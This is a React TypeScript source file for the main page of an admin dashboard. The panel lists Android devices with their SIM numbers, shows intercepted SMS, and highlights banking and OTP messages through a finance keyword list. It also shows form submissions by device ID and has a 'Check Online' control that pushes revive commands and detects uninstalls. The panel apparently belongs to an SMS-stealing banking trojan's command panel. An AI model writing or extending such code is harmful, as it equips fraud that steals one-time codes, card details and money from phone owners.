// src/pages/MainPage.tsx
import {
  useCallback, useEffect, useMemo, useRef, useState,
} from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import TopNav, { type TabKey } from "../components/layout/TopNav";
import wsService from "../services/ws/wsService";
import { getDevices }           from "../services/api/devices";
import { listFormSubmissions }  from "../services/api/forms";
import { listNotificationsGrouped } from "../services/api/sms";
import { ENV, apiHeaders }      from "../config/constants";
import { pickLastSeenAt }       from "../utils/reachability";

// ─── Types ───────────────────────────────────────────────────────────────────
type AnyRecord  = Record<string, any>;
type SortMode   = "new" | "old";
type DeviceSortMode = "latest" | "old2new";

// ─── Helpers ─────────────────────────────────────────────────────────────────
function s(v: any): string { return String(v ?? "").trim(); }

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} seconds ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.createdAt ?? m?.date;
  if (typeof t === "number" && t > 0) return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!isNaN(n) && n > 0) return n;
    const d = Date.parse(t);
    if (!isNaN(d)) return d;
  }
  return 0;
}

function getId(m: any): string {
  return s(m?._id || m?.id || "");
}

function getDeviceId(m: any): string {
  return s(m?.uniqueid || m?.deviceId || m?.device_id || m?._deviceId || "");
}

const FINANCE_KW = [
  "credit","debit","bank","balance","transaction","txn","upi","amount",
  "a/c","inr","₹","paid","withdrawn","deposited","statement","card","bill",
  "otp","one time","verification","debited","credited","received","payment",
  "ac no","acct","a/c no",
];
function isFinance(text: string): boolean {
  const lower = text.toLowerCase();
  return FINANCE_KW.some((kw) => lower.includes(kw));
}

function copy(text: string) {
  try { navigator.clipboard?.writeText(text); } catch {}
}

// ─── Copy Button ─────────────────────────────────────────────────────────────
function CopyBtn({ value }: { value: string }) {
  const [copied, setCopied] = useState(false);
  function handleCopy() {
    copy(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1200);
  }
  return (
    <button
      type="button"
      onClick={handleCopy}
      className="ml-1 shrink-0 text-[13px] opacity-60 hover:opacity-100"
      title="Copy"
    >
      {copied ? "✅" : "📋"}
    </button>
  );
}

// ─── Form Card ───────────────────────────────────────────────────────────────
function FormCard({ form, showDeviceLink, onDeviceClick }: {
  form: AnyRecord;
  showDeviceLink?: boolean;
  onDeviceClick?: (did: string) => void;
}) {
  const ts  = getTs(form);
  const did = getDeviceId(form);
  const payload = form.payload && typeof form.payload === "object"
    ? form.payload
    : form;

  // Skip meta keys
  const skip = new Set(["_id","id","uniqueid","deviceId","__v","createdAt","updatedAt","timestamp"]);
  const entries = Object.entries(payload).filter(([k]) => !skip.has(k) && !k.startsWith("_"));

  if (entries.length === 0) return null;

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {entries.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center gap-1">
            <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
            <CopyBtn value={s(v)} />
          </div>
          <div className="text-[13px] text-gray-800">{s(v) || "—"}</div>
        </div>
      ))}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        {did ? (
          <button
            type="button"
            onClick={() => onDeviceClick?.(did)}
            className="text-[12px] font-semibold text-green-600 hover:underline"
          >
            ID: {did.slice(0, 16)}
          </button>
        ) : <span />}
        <span className="text-[11px] text-gray-400">{timeAgo(ts)}</span>
      </div>
    </div>
  );
}

// ─── SMS Card ─────────────────────────────────────────────────────────────────
function SmsCard({ sms, onDeviceClick }: {
  sms: AnyRecord;
  onDeviceClick?: (did: string) => void;
}) {
  const ts      = getTs(sms);
  const did     = getDeviceId(sms);
  const msg     = s(sms.body || sms.message || sms.msg || "");
  const sender  = s(sms.sender || sms.senderNumber || sms.from || "");
  const mob1    = s(sms.receiver || sms.adminPhone || sms.mob || "");
  const mob2    = s(sms.receiver2 || sms.mob2 || "");
  const dateStr = ts ? new Date(ts).toString() : "-";
  const finance = isFinance(msg);

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {/* Date */}
      <div className="mb-2">
        <div className="flex items-center gap-1">
          <span className="text-[13px] font-semibold text-blue-600">Date:</span>
          <CopyBtn value={dateStr} />
        </div>
        <div className="text-[13px] text-gray-800">{dateStr}</div>
      </div>

      {/* MSG */}
      {msg && (
        <div className="mb-2">
          <div className="flex items-center gap-1">
            <span className="text-[13px] font-semibold text-blue-600">MSG:</span>
            <CopyBtn value={msg} />
          </div>
          <div className={["text-[13px]", finance ? "text-red-600" : "text-gray-800"].join(" ")}>
            {msg}
          </div>
        </div>
      )}

      {/* Sender */}
      {sender && (
        <div className="mb-2">
          <div className="flex items-center gap-1">
            <span className="text-[13px] font-semibold text-blue-600">SENDER:</span>
            <CopyBtn value={sender} />
          </div>
          <div className="text-[13px] text-gray-800">{sender}</div>
        </div>
      )}

      {/* MOB */}
      {mob1 && (
        <div className="mb-2">
          <div className="flex items-center gap-1">
            <span className="text-[13px] font-semibold text-blue-600">MOB:</span>
            <CopyBtn value={mob1} />
          </div>
          <div className="text-[13px] text-gray-800">{mob1}</div>
        </div>
      )}

      {/* MOB 2 */}
      {mob2 && (
        <div className="mb-2">
          <div className="flex items-center gap-1">
            <span className="text-[13px] font-semibold text-blue-600">MOB 2:</span>
            <CopyBtn value={mob2} />
          </div>
          <div className="text-[13px] text-gray-800">{mob2}</div>
        </div>
      )}

      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        {did ? (
          <button
            type="button"
            onClick={() => onDeviceClick?.(did)}
            className="text-[12px] font-semibold text-green-600 hover:underline"
          >
            ID: {did.slice(0, 16)}
          </button>
        ) : <span />}
        <span className="text-[11px] text-gray-400">{timeAgo(ts)}</span>
      </div>
    </div>
  );
}

// ─── Group Card ───────────────────────────────────────────────────────────────
function GroupCard({ deviceId, submissions, onDeviceClick }: {
  deviceId: string;
  submissions: AnyRecord[];
  onDeviceClick?: (did: string) => void;
}) {
  const latestTs = Math.max(...submissions.map(getTs).filter(Boolean));
  const skip = new Set(["_id","id","uniqueid","deviceId","__v","createdAt","updatedAt","timestamp"]);

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {submissions.map((sub, idx) => {
        const payload = sub.payload && typeof sub.payload === "object" ? sub.payload : sub;
        const entries = Object.entries(payload).filter(([k]) => !skip.has(k) && !k.startsWith("_"));
        if (entries.length === 0) return null;
        return (
          <div key={sub._id || sub.id || idx}>
            {entries.map(([k, v]) => (
              <div key={k} className="mb-2">
                <div className="flex items-center gap-1">
                  <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
                  <CopyBtn value={s(v)} />
                </div>
                <div className="text-[13px] text-gray-800">{s(v) || "—"}</div>
              </div>
            ))}
            {idx < submissions.length - 1 && <hr className="my-2 border-gray-200" />}
          </div>
        );
      })}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        <button
          type="button"
          onClick={() => onDeviceClick?.(deviceId)}
          className="text-[12px] font-semibold text-green-600 hover:underline"
        >
          ID: {deviceId.slice(0, 16)}
        </button>
        <span className="text-[11px] text-gray-400">
          {latestTs ? new Date(latestTs).toLocaleString() : "-"}
        </span>
      </div>
    </div>
  );
}

// ─── Device Card (2-col grid) ─────────────────────────────────────────────────
function DeviceCard({ device, displayNum, onCheckOnline }: {
  device: AnyRecord;
  displayNum: number;
  onCheckOnline: (did: string) => void;
}) {
  const did      = s(device.deviceId || device.uniqueid || "");
  const brand    = s(device.metadata?.brand || device.metadata?.manufacturer || "Unknown");
  const model    = s(device.metadata?.model || "");
  const android  = s(device.metadata?.androidVersion || "");
  const sim      = device.simInfo;
  const lastAt   = pickLastSeenAt(device);
  const ago      = timeAgo(lastAt);
  const isRecent = lastAt > 0 && (Date.now() - lastAt) < 60 * 60 * 1000; // < 1hr

  const sim1num     = s(sim?.sim1Number || "");
  const sim1carrier = s(sim?.sim1Carrier || "");
  const sim2num     = s(sim?.sim2Number || "");
  const sim2carrier = s(sim?.sim2Carrier || "");

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {/* Header */}
      <div className="mb-2 text-[13px] font-bold text-gray-900 text-center">
        {displayNum}. {brand}{model ? ` (${model})` : ""}
      </div>

      {/* Info table */}
      <div className="space-y-1 text-[12px]">
        <div>
          <span className="text-gray-500">ID: </span>
          <span className="font-semibold text-blue-600">{did.slice(0, 16)}</span>
        </div>
        {android && (
          <div>
            <span className="text-gray-500">Android: </span>
            <span className="text-gray-800">{android}</span>
          </div>
        )}
        {sim1num && (
          <div>
            <span className="text-gray-500">SIM 1: </span>
            <span className="text-gray-800">{sim1carrier ? `${sim1carrier}: ` : ""}{sim1num}</span>
          </div>
        )}
        {sim2num && (
          <div>
            <span className="text-gray-500">SIM 2: </span>
            <span className="text-gray-800">{sim2carrier ? `${sim2carrier}: ` : ""}{sim2num}</span>
          </div>
        )}
        <div>
          <span className="text-gray-500">Online: </span>
          <span className={isRecent ? "font-semibold text-green-600" : "font-semibold text-red-500"}>
            {ago}
          </span>
        </div>
      </div>

      {/* Check Online button */}
      <button
        type="button"
        onClick={() => onCheckOnline(did)}
        className="mt-3 w-full rounded-lg border border-gray-300 bg-white py-1.5 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 active:scale-[0.98]"
      >
        Check Online
      </button>
    </div>
  );
}

// ─── Check Online Alert Modal ─────────────────────────────────────────────────
function CheckAlert({ status, deviceId, onClose }: {
  status: "checking" | "online" | "offline" | "uninstalled";
  deviceId: string;
  onClose: () => void;
}) {
  const msg = status === "checking"
    ? "Checking device online…"
    : status === "online"
    ? "Device is Online"
    : status === "uninstalled"
    ? "App Uninstalled!"
    : "Device is Offline";

  const color = status === "online" ? "text-green-600"
    : status === "uninstalled" ? "text-red-600"
    : status === "offline" ? "text-red-600"
    : "text-gray-700";

  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40" onClick={onClose}>
      <div
        className="relative w-[300px] rounded-2xl bg-white p-6 shadow-xl"
        onClick={(e) => e.stopPropagation()}
      >
        <button
          type="button"
          onClick={onClose}
          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50"
        >
          ✕
        </button>
        <div className="mb-2 text-[15px] font-extrabold text-red-500">Alert</div>
        <div className={["text-[15px] font-semibold text-center mt-4", color].join(" ")}>
          {msg}
        </div>
        {status === "checking" && (
          <div className="mt-3 text-center text-[12px] text-gray-400 animate-pulse">
            Waiting for response…
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Search + Filter Bar ──────────────────────────────────────────────────────
function SearchBar({ value, onChange, filter, onFilter, filterOptions }: {
  value: string;
  onChange: (v: string) => void;
  filter: string;
  onFilter: (v: string) => void;
  filterOptions: { value: string; label: string }[];
}) {
  return (
    <div className="flex items-center gap-2 px-3 py-2">
      <div className="relative flex-1">
        <input
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder="Search data and press enter/search icon"
          className="h-10 w-full rounded-full border border-gray-300 bg-white pl-4 pr-10 text-[13px] outline-none focus:border-gray-400"
        />
        <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[18px]">🔍</span>
      </div>
      <select
        value={filter}
        onChange={(e) => onFilter(e.target.value)}
        className="h-10 rounded-full border border-gray-300 bg-white px-3 text-[13px] font-semibold text-gray-800 outline-none"
      >
        {filterOptions.map((o) => (
          <option key={o.value} value={o.value}>{o.label}</option>
        ))}
      </select>
    </div>
  );
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────────────
export default function MainPage() {
  const nav = useNavigate();

  const [activeTab, setActiveTab] = useState<TabKey>("home");
  const [darkMode,  setDarkMode]  = useState(false);
  const [search,    setSearch]    = useState("");
  const [sortMode,  setSortMode]  = useState<SortMode>("new");
  const [deviceSort, setDeviceSort] = useState<DeviceSortMode>("latest");

  // Data state
  const [devices,  setDevices]  = useState<AnyRecord[]>([]);
  const [forms,    setForms]    = useState<AnyRecord[]>([]);
  const [smsMap,   setSmsMap]   = useState<Record<string, AnyRecord[]>>({});

  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingForms,   setLoadingForms]   = useState(false);
  const [loadingSms,     setLoadingSms]     = useState(false);

  // Check online state
  const [checkAlert, setCheckAlert] = useState<{
    deviceId: string;
    status: "checking" | "online" | "offline" | "uninstalled";
  } | null>(null);
  const checkTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const checkDeviceIdRef = useRef<string>("");

  // ── Loaders ──────────────────────────────────────────────────────────────
  const loadDevices = useCallback(async () => {
    setLoadingDevices(true);
    try {
      const list = await getDevices();
      setDevices(Array.isArray(list) ? list : []);
    } catch (e) { console.error("loadDevices", e); }
    finally { setLoadingDevices(false); }
  }, []);

  const loadForms = useCallback(async () => {
    setLoadingForms(true);
    try {
      const list = await listFormSubmissions();
      setForms(Array.isArray(list) ? list : []);
    } catch (e) { console.error("loadForms", e); }
    finally { setLoadingForms(false); }
  }, []);

  const loadSms = useCallback(async () => {
    setLoadingSms(true);
    try {
      const grouped = await listNotificationsGrouped();
      setSmsMap(typeof grouped === "object" && grouped ? grouped : {});
    } catch (e) { console.error("loadSms", e); }
    finally { setLoadingSms(false); }
  }, []);

  const loadAll = useCallback(() => {
    loadDevices();
    loadForms();
    loadSms();
  }, [loadDevices, loadForms, loadSms]);

  // ── WS listener ──────────────────────────────────────────────────────────
  useEffect(() => {
    wsService.connect();
    loadAll();

    const off = wsService.onMessage((msg) => {
      if (!msg || msg.type !== "event") return;
      const event    = String(msg.event || "");
      const deviceId = String(msg.deviceId || msg?.data?.deviceId || "");

      // New SMS
      if (event === "notification") {
        const data = msg.data || {};
        const did  = String(data.deviceId || deviceId || "");
        if (!did) return;
        const newSms: AnyRecord = {
          ...data,
          _id: data._id || data.id || `${Date.now()}`,
          _deviceId: did,
          deviceId: did,
          timestamp: Number(data.timestamp || Date.now()),
        };
        setSmsMap((prev) => ({
          ...prev,
          [did]: [newSms, ...(prev[did] || [])].sort((a, b) => getTs(b) - getTs(a)),
        }));
        return;
      }

      // New form submission
      if (event === "form:created" || event === "form_submissions:created") {
        const data    = msg.data || {};
        const did     = String(data.uniqueid || data.deviceId || deviceId || "");
        const payload = data.payload && typeof data.payload === "object" ? data.payload : data;
        const newForm: AnyRecord = {
          _id: data._id || `${Date.now()}`,
          uniqueid: did,
          payload,
          createdAt: new Date().toISOString(),
          timestamp: Date.now(),
        };
        setForms((prev) => [newForm, ...prev]);
        return;
      }

      // Device lastSeen update
      if (event === "device:lastSeen" || event === "device:upsert") {
        const did         = String(msg.deviceId || msg?.data?.deviceId || "");
        const lastSeenAt  = Number(msg?.data?.lastSeen?.at || msg?.data?.at || Date.now());
        const action      = String(msg?.data?.lastSeen?.action || msg?.data?.action || "");
        const battery     = typeof msg?.data?.battery === "number" ? msg.data.battery : -1;

        setDevices((prev) =>
          prev.map((d) =>
            s(d.deviceId) === did
              ? { ...d, lastSeen: { at: lastSeenAt, action, battery } }
              : d
          )
        );

        // Check online response
        if (checkDeviceIdRef.current === did && checkAlert?.status === "checking") {
          if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
          setCheckAlert({ deviceId: did, status: "online" });
          setTimeout(() => setCheckAlert(null), 3000);
        }
        return;
      }

      // Device uninstalled
      if (event === "device:uninstalled") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        if (checkDeviceIdRef.current === did) {
          if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
          setCheckAlert({ deviceId: did, status: "uninstalled" });
        }
        return;
      }

      // Device deleted
      if (event === "device:delete") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        setDevices((prev) => prev.filter((d) => s(d.deviceId) !== did));
        setSmsMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; });
        return;
      }
    });

    return () => { off(); };
  }, [loadAll]);

  // ── Check Online ──────────────────────────────────────────────────────────
  const handleCheckOnline = useCallback(async (deviceId: string) => {
    if (!deviceId) return;
    checkDeviceIdRef.current = deviceId;
    setCheckAlert({ deviceId, status: "checking" });

    try {
      // Try revive first, then start
      try {
        await axios.post(
          `${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/revive`,
          { source: "main_page", force: true },
          { headers: apiHeaders(), timeout: 10000 }
        );
      } catch {
        await axios.post(
          `${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/start`,
          { source: "main_page", force: true },
          { headers: apiHeaders(), timeout: 10000 }
        );
      }
    } catch (e) {
      console.warn("checkOnline push failed", e);
    }

    // 2 min timeout → offline
    if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
    checkTimerRef.current = setTimeout(() => {
      setCheckAlert((prev) =>
        prev?.deviceId === deviceId && prev.status === "checking"
          ? { deviceId, status: "offline" }
          : prev
      );
    }, 2 * 60 * 1000);
  }, []);

  // ── Navigate to device detail ─────────────────────────────────────────────
  const openDevice = useCallback((deviceId: string) => {
    if (deviceId) nav(`/devices/${encodeURIComponent(deviceId)}`);
  }, [nav]);

  // ── All SMS flat list ─────────────────────────────────────────────────────
  const allSms = useMemo(() => {
    const list: AnyRecord[] = [];
    for (const [did, msgs] of Object.entries(smsMap)) {
      for (const m of (msgs || [])) {
        list.push({ ...m, _deviceId: did, deviceId: did });
      }
    }
    return list.sort((a, b) => getTs(b) - getTs(a));
  }, [smsMap]);

  // ── Mixed feed (Home) ─────────────────────────────────────────────────────
  const mixedFeed = useMemo(() => {
    const items: Array<AnyRecord & { _type: "form" | "sms"; _ts: number }> = [
      ...forms.map((f) => ({ ...f, _type: "form" as const, _ts: getTs(f) })),
      ...allSms.map((s) => ({ ...s, _type: "sms"  as const, _ts: getTs(s) })),
    ];
    return items.sort((a, b) => sortMode === "new" ? b._ts - a._ts : a._ts - b._ts);
  }, [forms, allSms, sortMode]);

  // ── Groups (by device) ────────────────────────────────────────────────────
  const groups = useMemo(() => {
    const map: Record<string, AnyRecord[]> = {};
    for (const f of forms) {
      const did = getDeviceId(f);
      if (!did) continue;
      if (!map[did]) map[did] = [];
      map[did].push(f);
    }
    return Object.entries(map).map(([did, subs]) => ({
      deviceId: did,
      submissions: subs,
      latestTs: Math.max(...subs.map(getTs).filter(Boolean)),
    })).sort((a, b) =>
      sortMode === "new" ? b.latestTs - a.latestTs : a.latestTs - b.latestTs
    );
  }, [forms, sortMode]);

  // ── Filtered data ─────────────────────────────────────────────────────────
  const q = search.trim().toLowerCase();

  const filteredFeed = useMemo(() => {
    if (!q) return mixedFeed;
    return mixedFeed.filter((item) => {
      const text = JSON.stringify(item).toLowerCase();
      return text.includes(q);
    });
  }, [mixedFeed, q]);

  const filteredForms = useMemo(() => {
    const sorted = [...forms].sort((a, b) =>
      sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)
    );
    if (!q) return sorted;
    return sorted.filter((f) => JSON.stringify(f).toLowerCase().includes(q));
  }, [forms, sortMode, q]);

  const filteredSms = useMemo(() => {
    const sorted = [...allSms].sort((a, b) =>
      sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)
    );
    if (!q) return sorted;
    return sorted.filter((s) => JSON.stringify(s).toLowerCase().includes(q));
  }, [allSms, sortMode, q]);

  const filteredGroups = useMemo(() => {
    if (!q) return groups;
    return groups.filter((g) =>
      g.deviceId.toLowerCase().includes(q) ||
      JSON.stringify(g.submissions).toLowerCase().includes(q)
    );
  }, [groups, q]);

  const sortedDevices = useMemo(() => {
    const list = [...devices];
    if (deviceSort === "latest") {
      list.sort((a, b) => pickLastSeenAt(b) - pickLastSeenAt(a));
    } else {
      list.sort((a, b) => pickLastSeenAt(a) - pickLastSeenAt(b));
    }
    if (!q) return list;
    return list.filter((d) => {
      const text = [
        s(d.deviceId), s(d.metadata?.brand), s(d.metadata?.model),
        s(d.simInfo?.sim1Number), s(d.simInfo?.sim2Number),
      ].join(" ").toLowerCase();
      return text.includes(q);
    });
  }, [devices, deviceSort, q]);

  // ── Tab change: reset search ──────────────────────────────────────────────
  function handleTabChange(tab: TabKey) {
    setActiveTab(tab);
    setSearch("");
  }

  // ── Render ────────────────────────────────────────────────────────────────
  const isLoading = loadingForms || loadingSms || loadingDevices;

  const SORT_OPTIONS = [
    { value: "new", label: "NEW" },
    { value: "old", label: "OLD" },
  ];

  const DEVICE_SORT_OPTIONS = [
    { value: "latest",  label: "Latest"   },
    { value: "old2new", label: "Old 2 New" },
  ];

  return (
    <div className={darkMode ? "dark" : ""}>
      <div className="min-h-screen bg-gray-50 text-gray-900">
        {/* Top navbar */}
        <TopNav
          activeTab={activeTab}
          onTabChange={handleTabChange}
          darkMode={darkMode}
          onToggleDark={() => setDarkMode((d) => !d)}
        />

        {/* Search bar (hidden on devices tab — has its own) */}
        {activeTab !== "devices" && activeTab !== "help" && (
          <SearchBar
            value={search}
            onChange={setSearch}
            filter={sortMode}
            onFilter={(v) => setSortMode(v as SortMode)}
            filterOptions={SORT_OPTIONS}
          />
        )}

        {/* ── HOME TAB ──────────────────────────────────────────────────── */}
        {activeTab === "home" && (
          <div className="space-y-3 px-3 pb-8 pt-1">
            {isLoading ? (
              <div className="py-10 text-center text-gray-400">Loading…</div>
            ) : filteredFeed.length === 0 ? (
              <div className="py-10 text-center text-gray-400">No data yet.</div>
            ) : (
              filteredFeed.map((item, idx) =>
                item._type === "form" ? (
                  <FormCard
                    key={getId(item) || idx}
                    form={item}
                    onDeviceClick={openDevice}
                  />
                ) : (
                  <SmsCard
                    key={getId(item) || idx}
                    sms={item}
                    onDeviceClick={openDevice}
                  />
                )
              )
            )}
          </div>
        )}

        {/* ── DATA TAB ──────────────────────────────────────────────────── */}
        {activeTab === "data" && (
          <div className="space-y-3 px-3 pb-8 pt-1">
            {loadingForms ? (
              <div className="py-10 text-center text-gray-400">Loading…</div>
            ) : filteredForms.length === 0 ? (
              <div className="py-10 text-center text-gray-400">No form data.</div>
            ) : (
              filteredForms.map((f, idx) => (
                <FormCard
                  key={getId(f) || idx}
                  form={f}
                  onDeviceClick={openDevice}
                />
              ))
            )}
          </div>
        )}

        {/* ── MESSAGES TAB ──────────────────────────────────────────────── */}
        {activeTab === "messages" && (
          <div className="space-y-3 px-3 pb-8 pt-1">
            {loadingSms ? (
              <div className="py-10 text-center text-gray-400">Loading…</div>
            ) : filteredSms.length === 0 ? (
              <div className="py-10 text-center text-gray-400">No messages.</div>
            ) : (
              filteredSms.map((m, idx) => (
                <SmsCard
                  key={getId(m) || idx}
                  sms={m}
                  onDeviceClick={openDevice}
                />
              ))
            )}
          </div>
        )}

        {/* ── GROUPS TAB ────────────────────────────────────────────────── */}
        {activeTab === "groups" && (
          <div className="space-y-3 px-3 pb-8 pt-1">
            {loadingForms ? (
              <div className="py-10 text-center text-gray-400">Loading…</div>
            ) : filteredGroups.length === 0 ? (
              <div className="py-10 text-center text-gray-400">No grouped data.</div>
            ) : (
              filteredGroups.map((g) => (
                <GroupCard
                  key={g.deviceId}
                  deviceId={g.deviceId}
                  submissions={g.submissions}
                  onDeviceClick={openDevice}
                />
              ))
            )}
          </div>
        )}

        {/* ── DEVICES TAB ───────────────────────────────────────────────── */}
        {activeTab === "devices" && (
          <div className="pb-8">
            <SearchBar
              value={search}
              onChange={setSearch}
              filter={deviceSort}
              onFilter={(v) => setDeviceSort(v as DeviceSortMode)}
              filterOptions={DEVICE_SORT_OPTIONS}
            />
            {loadingDevices ? (
              <div className="py-10 text-center text-gray-400">Loading…</div>
            ) : sortedDevices.length === 0 ? (
              <div className="py-10 text-center text-gray-400">No devices found.</div>
            ) : (
              <div className="grid grid-cols-2 gap-3 px-3 pt-1">
                {sortedDevices.map((d, idx) => {
                  const displayNum = sortedDevices.length - idx;
                  return (
                    <DeviceCard
                      key={s(d.deviceId) || idx}
                      device={d}
                      displayNum={displayNum}
                      onCheckOnline={handleCheckOnline}
                    />
                  );
                })}
              </div>
            )}
          </div>
        )}

        {/* ── HELP TAB ──────────────────────────────────────────────────── */}
        {activeTab === "help" && (
          <div className="px-4 py-8 text-center text-gray-500">
            <div className="text-[18px] font-bold mb-2">Help</div>
            <div className="text-[13px]">Content coming soon…</div>
          </div>
        )}

        {/* ── Refresh Button (floating) ──────────────────────────────────── */}
        <button
          type="button"
          onClick={loadAll}
          className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800"
          title="Refresh"
        >
          ↻
        </button>

        {/* ── Check Online Alert ─────────────────────────────────────────── */}
        {checkAlert && (
          <CheckAlert
            status={checkAlert.status}
            deviceId={checkAlert.deviceId}
            onClose={() => {
              if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
              setCheckAlert(null);
            }}
          />
        )}
      </div>
    </div>
  );
}
